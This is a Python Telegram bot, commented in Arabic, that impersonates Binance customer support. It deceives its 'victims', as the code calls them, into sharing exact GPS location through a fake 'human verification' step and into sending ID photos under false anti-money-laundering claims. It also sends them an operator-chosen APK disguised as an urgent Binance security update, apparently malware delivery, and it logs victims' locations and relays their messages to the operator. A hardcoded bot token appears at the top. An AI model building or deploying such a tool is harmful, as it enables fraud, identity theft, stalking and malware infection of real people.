#!/usr/bin/env python3
"""
بوت تليجرام متكامل - مع ميزات متقدمة للتواصل مع الخاطف
"""

import os
import time
import logging
from datetime import datetime
from telebot import TeleBot, types

# ================== الإعدادات ==================
BOT_TOKEN = "8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw"
OWNER_ID = 8391968596  # ضع معرفك هنا
# ==============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = TeleBot(BOT_TOKEN)

visitors = {}
current_target = None
waiting_for_apk = {}  # لتخزين حالة انتظار رفع APK

# ================== الأوامر الأساسية ==================

@bot.message_handler(commands=['start'])
def start_handler(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""
    full_name = f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()

    visitors[cid] = {
        'username': uname,
        'name': fname,
        'full_name': full_name,
        'user_id': uid,
        'first_seen': datetime.now().isoformat()
    }

    # إشعار للمطور مع جميع المعلومات
    if uid != OWNER_ID:
        bot.send_message(OWNER_ID, 
            f"🆕 **متصل جديد!**\n"
            f"👤 **الاسم:** {full_name or 'غير مسجل'}\n"
            f"🆔 **اليوزر:** @{uname or 'لا يوجد'}\n"
            f"🔢 **المعرف (ID):** `{uid}`\n"
            f"🕐 **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"_للتحدث معه استخدم:_ `/chat {uid}`",
            parse_mode="Markdown")

    if uid == OWNER_ID:
        show_admin_panel(cid)
        return

    # رسالة ترحيب مقنعة للضحية
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📞 تواصل مع الدعم"))
    
    bot.send_message(cid, 
        "👋 مرحباً بك في خدمة عملاء **Binance**.\n"
        "نحن هنا لمساعدتك في إتمام عمليات التحويل.\n\n"
        "📌 للتواصل مع أحد الممثلين، اضغط على الزر أدناه.",
        reply_markup=markup)

# ================== أمر الدردشة المباشرة ==================

@bot.message_handler(commands=['chat'])
def chat_with_target(message):
    """التحدث مع ضحية محددة عبر ID"""
    try:
        target_id = int(message.text.split()[1])
        if target_id in visitors:
            global current_target
            current_target = target_id
            data = visitors[target_id]
            bot.send_message(OWNER_ID, 
                f"✅ **تم التبديل إلى محادثة:**\n"
                f"👤 {data.get('full_name', 'غير مسجل')}\n"
                f"🆔 @{data.get('username', 'لا يوجد')}\n"
                f"🔢 `{target_id}`\n\n"
                f"_أرسل رسالتك الآن، وستصل إليه مباشرة._",
                parse_mode="Markdown")
            bot.register_next_step_handler(message, send_direct_message)
        else:
            bot.send_message(OWNER_ID, "❌ هذا المعرف غير موجود في قائمة المتصلين")
    except:
        bot.send_message(OWNER_ID, "❌ **الاستخدام:** `/chat [ID]`\nمثال: `/chat 123456789`")

def send_direct_message(message):
    """إرسال رسالة مباشرة للضحية"""
    global current_target
    if current_target and message.text:
        bot.send_message(current_target, f"📨 **رسالة من الدعم:**\n{message.text}")
        bot.send_message(OWNER_ID, f"✅ **تم إرسال رسالتك للضحية:**\n\n{message.text}")

# ================== لوحة التحكم ==================

def show_admin_panel(cid):
    # عرض المتصلين
    if visitors:
        msg = "📊 **المتصلون حالياً:**\n\n"
        for cid, data in visitors.items():
            uname = data.get('username', '?') or 'بدون يوزر'
            name = data.get('full_name', '?')
            is_current = "👉" if cid == current_target else "⚪"
            msg += f"{is_current} `{cid}` - {name} (@{uname})\n"
        bot.send_message(cid, msg, parse_mode="Markdown")
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        "📍 طلب موقع مقنع",
        "📸 طلب صورة",
        "📨 إرسال رسالة",
        "🎤 إرسال صوت",
        "📷 إرسال صورة",
        "📦 إرسال تطبيق APK",
        "📊 تحديث المتصلين",
        "🔄 إعادة تشغيل"
    )
    
    bot.send_message(cid, 
        "🟢 **لوحة التحكم المتقدمة**\n\n"
        "📍 طلب موقع مقنع - يطلب الموقع بشكل آمن\n"
        "📸 طلب صورة - يطلب صورة الهوية\n"
        "📨 إرسال رسالة - تكتب رسالة وترسلها\n"
        "🎤 إرسال صوت - ترفع ملف صوتي وترسله\n"
        "📷 إرسال صورة - ترفع صورة وترسلها\n"
        "📦 إرسال تطبيق - ترفع APK وترسله\n\n"
        "💡 **للتواصل المباشر:** `/chat [ID]`",
        reply_markup=markup,
        parse_mode="Markdown")

# ================== طلب موقع مقنع ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📍 طلب موقع مقنع")
def request_location_convincing(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** `/chat [ID]`")
        return

    text = """🔒 **تأكيد هوية المستخدم** 🔒

نحن نقوم بتأكيد هويتك للتأكد من أنك **إنسان وليس روبوت آلي**.

📍 **مشاركة موقعك الحالي** (لن يتم حفظه أو مشاركته مع أي طرف آخر)

✅ هذا الإجراء آمن ومشفر بالكامل.
⏳ سيتم إلغاء التحويل تلقائياً إذا لم يتم التأكيد خلال 24 ساعة."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📍 مشاركة الموقع للتأكيد", request_location=True)
    markup.add(btn)
    
    bot.send_message(current_target, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب موقع مقنع للضحية")

# ================== طلب صورة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📸 طلب صورة")
def request_photo(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** `/chat [ID]`")
        return

    text = """🪪 **توثيق الهوية**

لإتمام عملية التحويل، يرجى إرسال صورة واضحة لهويتك (بطاقة شخصية أو جواز سفر).

⚠️ هذا الإجراء إلزامي وفقاً لقوانين مكافحة غسيل الأموال."""
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📸 إرسال صورة الهوية")
    markup.add(btn)
    
    bot.send_message(current_target, text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(OWNER_ID, "✅ تم إرسال طلب صورة للضحية")

# ================== إرسال تطبيق APK ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📦 إرسال تطبيق APK")
def send_apk_prompt(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** `/chat [ID]`")
        return
    
    bot.send_message(OWNER_ID, 
        "📦 **أرسل ملف APK الذي تريد إرساله للضحية:**\n\n"
        "_يمكنك إرسال أي ملف APK، وسيتم إعادة توجيهه للضحية._",
        parse_mode="Markdown")
    bot.register_next_step_handler(message, process_apk)

def process_apk(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ لم يتم تحديد ضحية")
        return
    
    if message.document and message.document.file_name.endswith('.apk'):
        # إرسال APK للضحية
        caption = "📲 **تحديث أمني عاجل**\n\n"
        caption += "تم اكتشاف ثغرة أمنية في جهازك.\n"
        caption += "الرجاء تثبيت هذا التحديث فوراً لضمان أمان حسابك.\n\n"
        caption += "🔒 هذا التحديث آمن ومصدق من Binance."
        
        bot.send_document(current_target, message.document.file_id, caption=caption, parse_mode="Markdown")
        bot.send_message(OWNER_ID, f"✅ تم إرسال APK للضحية:\n📁 {message.document.file_name}")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال ملف APK صحيح (ينتهي بـ .apk)")

# ================== استقبال الموقع ==================

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        sender_id = message.from_user.id
        
        if sender_id in visitors:
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            data = visitors[sender_id]
            
            msg = f"""📍 **تم استلام موقع الضحية!**

👤 **الاسم:** {data.get('full_name', 'غير مسجل')}
🆔 **اليوزر:** @{data.get('username', 'لا يوجد')}
🔢 **المعرف:** `{sender_id}`

📍 **الإحداثيات:**
**العرض:** `{lat}`
**الطول:** `{lon}`
**الدقة:** {message.location.horizontal_accuracy or 'غير متوفر'} متر

🔗 [فتح في خرائط جوجل]({maps_link})"""
            
            bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
            bot.send_location(OWNER_ID, lat, lon)
            
            # حفظ في ملف
            with open("target_locations.txt", "a") as f:
                f.write(f"{datetime.now().isoformat()},{sender_id},{lat},{lon}\n")

# ================== استقبال الصور ==================

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    if message.photo:
        photo = message.photo[-1]
        file_info = bot.get_file(photo.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs("photos", exist_ok=True)
        file_path = f"photos/photo_{timestamp}.jpg"
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        sender_id = message.from_user.id
        data = visitors.get(sender_id, {})
        
        with open(file_path, 'rb') as f:
            bot.send_photo(OWNER_ID, f, 
                caption=f"📸 **صورة من الضحية**\n"
                       f"👤 {data.get('full_name', 'غير مسجل')}\n"
                       f"🆔 @{data.get('username', 'لا يوجد')}\n"
                       f"⏰ {timestamp}")

# ================== إرسال رسالة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال رسالة")
def send_custom_message_prompt(message):
    bot.send_message(OWNER_ID, "✏️ **أكتب الرسالة التي تريد إرسالها للضحية:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_custom_message)

def process_custom_message(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** `/chat [ID]`")
        return
    
    bot.send_message(current_target, f"📨 **رسالة من الدعم:**\n{message.text}")
    bot.send_message(OWNER_ID, f"✅ **تم إرسال رسالتك:**\n\n{message.text}")

# ================== إرسال صوت ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🎤 إرسال صوت")
def send_audio_prompt(message):
    bot.send_message(OWNER_ID, "🎤 **أرسل الملف الصوتي:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_audio)

def process_audio(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** `/chat [ID]`")
        return
    
    if message.audio or message.voice:
        if message.audio:
            bot.send_audio(current_target, message.audio.file_id)
        else:
            bot.send_voice(current_target, message.voice.file_id)
        bot.send_message(OWNER_ID, "✅ تم إرسال الملف الصوتي")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال ملف صوتي صحيح")

# ================== إرسال صورة ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📷 إرسال صورة")
def send_photo_prompt(message):
    bot.send_message(OWNER_ID, "📷 **أرسل الصورة:**", parse_mode="Markdown")
    bot.register_next_step_handler(message, process_photo)

def process_photo(message):
    global current_target
    if not current_target:
        bot.send_message(OWNER_ID, "❌ **اختر ضحية أولاً:** `/chat [ID]`")
        return
    
    if message.photo:
        bot.send_photo(current_target, message.photo[-1].file_id, caption="📷 صورة من الدعم")
        bot.send_message(OWNER_ID, "✅ تم إرسال الصورة")
    else:
        bot.send_message(OWNER_ID, "❌ يرجى إرسال صورة صحيحة")

# ================== تحديث المتصلين ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 تحديث المتصلين")
def show_visitors(message):
    if not visitors:
        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين")
        return
    
    msg = "📊 **المتصلون:**\n\n"
    for cid, data in visitors.items():
        uname = data.get('username', '?') or 'بدون يوزر'
        name = data.get('full_name', '?')
        is_current = "👉" if cid == current_target else "⚪"
        msg += f"{is_current} `{cid}` - {name} (@{uname})\n"
    
    msg += "\n💡 **للتحدث مع أحدهم:** `/chat [ID]`"
    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")

# ================== إعادة تشغيل ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔄 إعادة تشغيل")
def restart_bot(message):
    bot.send_message(OWNER_ID, "🔄 جاري إعادة التشغيل...")
    os._exit(0)

# ================== استقبال أي رسالة ==================

@bot.message_handler(func=lambda m: True)
def catch_all(message):
    cid = message.chat.id
    uid = message.from_user.id
    
    if uid != OWNER_ID and cid in visitors:
        text = message.text or "[وسائط]"
        data = visitors[cid]
        bot.send_message(OWNER_ID, 
            f"✉️ **رسالة جديدة:**\n"
            f"👤 {data.get('full_name', 'غير مسجل')}\n"
            f"🆔 @{data.get('username', 'لا يوجد')}\n"
            f"🔢 `{uid}`\n"
            f"💬 {text}",
            parse_mode="Markdown")

# ================== التشغيل ==================

if __name__ == "__main__":
    os.makedirs("photos", exist_ok=True)
    print("✅ البوت شغال! انتظار اتصال الضحايا...")
    
    try:
        bot.send_message(OWNER_ID, "🟢 **البوت شغال!**\n/start للوحة التحكم", parse_mode="Markdown")
    except:
        pass
    
    bot.infinity_polling()
